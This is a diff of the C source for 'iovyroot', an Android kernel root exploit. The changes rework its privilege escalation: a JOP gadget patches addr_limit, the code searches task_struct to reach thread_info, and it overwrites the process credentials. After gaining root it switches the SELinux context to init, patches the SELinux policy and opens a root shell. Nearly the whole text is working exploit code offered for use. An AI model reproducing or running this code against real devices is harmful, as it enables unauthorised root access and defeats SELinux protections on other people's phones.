@@ -2,18 +2,18 @@
 #include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
-
+#include <unistd.h>
 #include <netinet/ip.h>
-
+#include <fcntl.h>
 #include <sys/mman.h>
 #include <sys/uio.h>
-
 #include <sys/resource.h>
 
 #include "getroot.h"
-#include "sidtab.h"
-#include "policydb.h"
 #include "offsets.h"
+#include "selinux.h"
+#include "policy.h"
+#include "util64.h"
 
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
@@ -255,7 +255,7 @@ static int setprocesspriority()
 {
 	int ret;
 	printf("[+] Changing process priority to highest\n");
-	if((ret = setpriority(PRIO_PROCESS, 0, -20)) == -1)
+	if((ret = setpriority(PRIO_PROCESS, 0, -19)) == -1)
 		perror("setpriority()");
 	return ret;
 }
@@ -303,8 +303,6 @@ int getroot(struct offsets* o)
 	if(write_at_address(o->fsync, (long)MMAP_START))
 		return 1;
 
-	sidtab = o->sidtab;
-	policydb = o->policydb;
 	copyshellcode(MMAP_START);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
@@ -328,63 +326,82 @@ end:
 	return ret;
 }
 #else
-int getroot(struct offsets* o)
+
+int getroot2(struct offsets2* o)
 {
 	int ret = 1;
 	int dev;
-	unsigned long fp;
+	//unsigned long fp;
 	struct thread_info* ti;
 
-	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (long)o->joploc))
+	printf("[+] Installing patch addr_limit JOP\n");
+	if(write_at_address(o->check_flags, (long)o->patch_addr_limit_joploc))
 		return 1;
 
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	preparejop(MMAP_START, o->jopret);
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
+	preparejop2(MMAP_START, o);
+	if((dev = open("/dev/zero", O_RDWR)) < 0)
 		return 1;
-
-	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
-	fp += KERNEL_START;
-	ti = get_thread_info(fp);
 
 	printf("[+] Patching addr_limit\n");
-	if(write_at_address(&ti->addr_limit, -1))
-		goto end;
-	printf("[+] Removing JOP\n");
+	fcntl(dev, F_SETFL, MMAP_START);
+
+	printf("[+] Removing patch addr_limit JOP\n");
 	if(writel_at_address_pipe(o->check_flags, 0))
 		goto end;
 
+	//printf("[+] Installing get_threadinfo JOP\n");
+	//if(writel_at_address_pipe(o->check_flags, (long)o->get_threadinfo_joploc))
+	//	goto end;
+
+	//printf("[+] Getting threadinfo...\n");
+	//fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
+	//fp += KERNEL_START;
+	//ti = get_thread_info(fp);
+
+	//printf("[+] Removing get_threadinfo JOP\n");
+	//if(writel_at_address_pipe(o->check_flags, 0))
+	//	goto end;
+
+	printf("sizeof(unsigned long) = %d\n", sizeof(unsigned long));
+	printf("sizeof(int) = %d\n", sizeof(int));
+	if(0!=init_utils64()) {
+		printf("[+] task_struct search init error!\n");
+		goto end;
+	}
+	if(0!=new_search_task64()) {
+		printf("[+] task_struct search error!\n");
+		goto end;
+	}
+	unsigned long current_task_struct = get_task_struct64();
+
+	if(read_at_address_pipe((void*)(current_task_struct+8), &ti, sizeof(ti))) {
+		printf("[+] Read stack base error from task_struct!\n");
+		goto end;
+	}
+
+	printf("[+] Root ...\n");
 	if((ret = modify_task_cred_uc(ti)))
 		goto end;
-
-	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
 
 	ret = 0;
 end:
 	close(dev);
 	return ret;
 }
+
 #endif
 
 int main(int argc, char* argv[])
 {
 	unsigned int i;
 	int ret = 1;
-	struct offsets* o;
+	struct offsets2* o;
+	policy_t patched_sepolicy = NULL;
 
 	printf("iovyroot by zxz0O0\n");
 	printf("poc by idler1984\n\n");
 
-	if(!(o = get_offsets()))
+	if(!(o = get_offsets2()))
 		return 1;
 	if(setfdlimit())
 		return 1;
@@ -395,7 +412,9 @@ int main(int argc, char* argv[])
 	if(initmappings())
 		return 1;
 
-	ret = getroot(o);
+	patched_sepolicy = prepare_policy();
+
+	ret = getroot2(o);
 	//let the threads end
 	sleep(1);
 
@@ -408,6 +427,20 @@ int main(int argc, char* argv[])
 	if(getuid() == 0)
 	{
 		printf("got root lmao\n");
+		ret = setprocattrcon("u:r:init:s0", 0, "current");
+		if(ret != 0) {
+			printf("set scontext to u:r:init:s0 error!\n");
+			return -1;
+		}
+
+		if(patched_sepolicy != NULL) {
+			ret = patch_policy(patched_sepolicy);
+			if(ret != 0) {
+				printf("patch sepolicy error!\n");
+			}
+			destroy_policy(patched_sepolicy);
+		}
+
 		if(argc <= 1)
 			system("USER=root /system/bin/sh");
 		else
